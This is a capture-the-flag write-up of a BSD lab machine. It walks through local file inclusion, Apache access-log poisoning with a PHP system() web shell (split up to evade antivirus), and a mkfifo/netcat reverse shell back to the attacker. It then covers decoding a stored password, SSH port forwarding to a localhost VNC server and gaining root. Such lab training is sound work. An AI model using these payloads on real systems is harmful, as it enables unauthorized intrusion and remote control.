This is a room for Log poisoning
The open ports are ssh and 80
Open the webpage, and it shows the "webpage to be tested" box, where we can enter a file, and it opens the file.
We tried with /etc/passwd, and it showed that file. So the next suspect was code injection through log file poisoning.
Find out that the webpage is running specific apache, look for where the log file would be stored.
phpinfo.php shows the variable  `allow_url_include` is off, which eliminates direct RFI.
/var/log/apache/access.log or /var/log/apache2/access.log or /var/log/httpd-access.log OR /etc/httpd
we test for all, and find it at /var/log/httpd-access.log

So, start burp, catch a request to get a file
First, we can change the user-agent to see if it reflects. Once verified, time for php injection
We see each of the fields enclosed in double quotes. A hint that says, it might escape any double-quotes in the input
Start with appending a " at the end of the user-agent, and it does escape with \"
So we try with' and see it doesnt escape.
start with just echo `<?php echo('dint read tags'); ?>`
And we see it executes it, and only shows "dint read tags"

Now we try with the actual code. (code fragmented cuz windows defender keeps deleting it)
remove the new line chars
```
<?php system($_
REQUEST
['ajvar']
);
 ?>
```
Now, we visit the httpd-access.log&ajvar=id
we see it executes the `id`
Now, replace the id with mkfifo reverse shell
`mkfifo /tmp/f; nc [LOCAL-IP] [PORT] < /tmp/f | /bin/sh >/tmp/f 2>&1; rm tmp/f`
But since it is BSD, we gotta take out the 2>&1 redirect
`mkfifo /tmp/f; nc 10.10.14.31 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm tmp/f`
Take it to burp, and url-encode it, send it as &ajvar=
We get a shell
Ther's a password backup text, base64encoded 12 times.
copy it over, decode it 12 times
That's the ssh password for user charix

Once we do, we see a secret.zip file. send it as scp, cuz python doesnt seem to be there
on kali, `scp charix@10.129.1.254:/home/charix/secret.zip secret.zip`
unzip secret.zip with charix's password. seems like some gibberish chars

`ps -aux` shows us some weird xvnc running
To check the port, we figure out BSD netstat command flag and
`netstat -an -p tcp`
this shows us 5801 and 5901 listening only on localhost, which are vnc ports for remote desktop
`ps -auwwx | grep vnc` shows us it is listening on 5901
We'll need to break out the ssh port forwarding. since we're already on ssh, we quit.
alternatively, we would get it done through proxychains
`ssh -L6901:127.0.0.1:5901 -L6801:127.0.0.1:5801 charix@10.129.1.254`

on kali, `vncviewer 127.0.0.1:6901 -passwd secret`
and root!
